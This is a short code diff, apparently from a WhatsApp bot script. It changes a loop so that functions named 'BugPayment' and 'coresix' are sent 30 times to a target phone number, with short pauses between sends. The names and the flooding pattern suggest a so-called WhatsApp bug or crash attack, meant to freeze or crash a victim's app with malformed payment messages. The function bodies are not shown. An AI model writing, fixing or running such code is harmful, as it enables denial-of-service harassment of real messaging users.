@@ -1604,9 +1604,9 @@ let target = bijipler + '@s.whatsapp.net'
 await bugpayflow(Pe);
 for (let j = 0; j < 30; j++) {
 await BugPayment(target)
-await coresix(Pe, "", 1020000, true);
+await coresix(target, "", 1020000, true);
 await BugPayment(target)
-await coresix(Pe, "", 1020000, true);
+await coresix(target, "", 1020000, true);
 await BugPayment(target);
 await sleep(500)
 }
